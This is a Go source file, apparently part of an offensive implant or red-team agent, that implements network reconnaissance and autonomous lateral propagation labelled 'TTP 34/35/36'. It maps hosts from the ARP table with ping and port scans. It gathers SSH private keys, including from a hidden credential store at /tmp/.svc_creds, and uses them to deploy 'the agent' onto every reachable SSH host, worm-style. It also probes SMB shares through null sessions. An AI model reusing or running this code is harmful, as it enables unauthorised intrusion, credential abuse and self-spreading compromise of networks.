package ttp

// auto_spread.go — TTP 34/35/36: enhanced recon + autonomous lateral propagation
//
// TTP 34 (net_map):   ARP + ICMP + configurable TCP port scan; OS fingerprint; JSON output
// TTP 35 (auto_spread): combines 34+21+22 in loop; propagates to each reachable host
// TTP 36 (smb_probe): port 445 probe + optional auth test with collected creds

import (
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"
)

// HostInfo describes a discovered host.
type HostInfo struct {
	IP       string   `json:"ip"`
	MAC      string   `json:"mac,omitempty"`
	Hostname string   `json:"hostname,omitempty"`
	OpenPorts []int   `json:"open_ports,omitempty"`
	ICMP     bool     `json:"icmp,omitempty"`
	OS       string   `json:"os_hint,omitempty"`
}

// SpreadResult is the output of TTP 35.
type SpreadResult struct {
	Hosts      []HostInfo `json:"hosts"`
	Deployed   []string   `json:"deployed"`
	Failed     []string   `json:"failed"`
}

// defaultScanPorts are the ports probed during net_map.
var defaultScanPorts = []int{22, 80, 443, 445, 3306, 5432, 6379, 8080, 8443}

// NetMap performs enhanced network discovery and returns JSON.
// params: optional comma-separated ports override, e.g. "22,80,443"
func NetMap(params string) (string, error) {
	scanPorts := defaultScanPorts
	if params != "" {
		scanPorts = parsePorts(params)
	}

	hosts, err := parseARPTable()
	if err != nil {
		return "", fmt.Errorf("arp: %w", err)
	}

	// Also check local subnets via /proc/net/route for any additional subnets
	// (no active scan — only ARP-resolved hosts)

	var mu sync.Mutex
	var results []HostInfo
	var wg sync.WaitGroup

	for _, ip := range hosts {
		wg.Add(1)
		go func(ip string) {
			defer wg.Done()
			info := HostInfo{IP: ip}

			// ICMP ping (best-effort, requires CAP_NET_RAW or falls back gracefully)
			info.ICMP = pingHost(ip)

			// TCP port scan
			for _, port := range scanPorts {
				if probeTCP(ip, port, time.Second) == "open" {
					info.OpenPorts = append(info.OpenPorts, port)
				}
			}

			// Reverse DNS (non-blocking, short timeout)
			if names, err := net.LookupAddr(ip); err == nil && len(names) > 0 {
				info.Hostname = strings.TrimSuffix(names[0], ".")
			}

			// OS fingerprint hint from open ports
			info.OS = osHint(info.OpenPorts)

			mu.Lock()
			results = append(results, info)
			mu.Unlock()
		}(ip)
	}
	wg.Wait()

	out, _ := json.MarshalIndent(SpreadResult{Hosts: results}, "", "  ")
	return string(out), nil
}

// AutoSpread discovers hosts on the LAN and propagates the agent to each :22-reachable host.
// Combines TTP 34 (discovery) + TTP 21 (key harvest) + TTP 22 (lateral move).
func AutoSpread() (string, error) {
	hosts, err := parseARPTable()
	if err != nil {
		return "", fmt.Errorf("arp: %w", err)
	}

	keys := discoverSSHPrivKeys()
	if len(keys) == 0 {
		return "", fmt.Errorf("auto_spread: no SSH keys found — run TTP 21 first")
	}

	result := SpreadResult{}
	var mu sync.Mutex
	var wg sync.WaitGroup

	selfIP := localIP()

	for _, ip := range hosts {
		if ip == selfIP {
			continue
		}
		if probeTCP(ip, 22, 2*time.Second) != "open" {
			continue
		}
		info := HostInfo{IP: ip, OpenPorts: []int{22}}
		mu.Lock()
		result.Hosts = append(result.Hosts, info)
		mu.Unlock()

		wg.Add(1)
		go func(ip string) {
			defer wg.Done()
			msg, err := LateralMove(ip)
			mu.Lock()
			if err != nil {
				result.Failed = append(result.Failed, ip+": "+err.Error())
			} else {
				result.Deployed = append(result.Deployed, msg)
			}
			mu.Unlock()
		}(ip)
	}
	wg.Wait()

	out, _ := json.MarshalIndent(result, "", "  ")
	return string(out), nil
}

// SMBProbe checks port 445 on discovered hosts.
// If smbclient is available and creds are passed, attempts an auth test.
// params: optional "user:password@host" or empty (scan ARP table)
func SMBProbe(params string) (string, error) {
	var targets []string

	if params != "" {
		targets = strings.Fields(params)
	} else {
		hosts, err := parseARPTable()
		if err != nil {
			return "", fmt.Errorf("arp: %w", err)
		}
		targets = hosts
	}

	var lines []string
	for _, ip := range targets {
		status := probeTCP(ip, 445, 2*time.Second)
		line := fmt.Sprintf("%s:445 %s", ip, status)
		if status == "open" {
			// Try null session with smbclient if available
			if _, err := exec.LookPath("smbclient"); err == nil {
				out, _ := exec.Command("smbclient", "-N", "-L", "//"+ip, "--option=client min protocol=SMB2").
					Output()
				if len(out) > 0 {
					line += "  [" + strings.TrimSpace(strings.Split(string(out), "\n")[0]) + "]"
				}
			}
		}
		lines = append(lines, line)
	}

	if len(lines) == 0 {
		return "smb_probe: no hosts", nil
	}
	return strings.Join(lines, "\n"), nil
}

// parsePorts parses a comma-separated port list.
func parsePorts(s string) []int {
	var ports []int
	for _, p := range strings.Split(s, ",") {
		var n int
		if _, err := fmt.Sscanf(strings.TrimSpace(p), "%d", &n); err == nil && n > 0 && n < 65536 {
			ports = append(ports, n)
		}
	}
	if len(ports) == 0 {
		return defaultScanPorts
	}
	return ports
}

// pingHost sends a single ICMP echo using the system ping binary (no CAP_NET_RAW needed).
func pingHost(ip string) bool {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("ping", "-n", "1", "-w", "1000", ip)
	} else {
		cmd = exec.Command("ping", "-c", "1", "-W", "1", ip)
	}
	cmd.Stdout = nil
	cmd.Stderr = nil
	return cmd.Run() == nil
}

// osHint guesses OS from open port set.
func osHint(ports []int) string {
	portSet := map[int]bool{}
	for _, p := range ports {
		portSet[p] = true
	}
	if portSet[445] && portSet[3389] {
		return "windows"
	}
	if portSet[22] && !portSet[445] {
		return "linux"
	}
	if portSet[445] {
		return "windows/samba"
	}
	return ""
}

// localIP returns the primary non-loopback IPv4 address.
func localIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return ""
}

// discoverSSHKeysFromFiles supplements discoverSSHPrivKeys with any keys found via TTP 7/21 output.
// Checks the harvested credentials store in /tmp/.svc_creds if present.
func discoverSSHKeysFromFiles() []string {
	keys := discoverSSHPrivKeys()
	if data, err := os.ReadFile("/tmp/.svc_creds"); err == nil {
		for _, line := range strings.Split(string(data), "\n") {
			if strings.HasPrefix(line, "key:") {
				path := strings.TrimPrefix(line, "key:")
				if _, err := os.Stat(path); err == nil {
					keys = append(keys, path)
				}
			}
		}
	}
	return keys
}
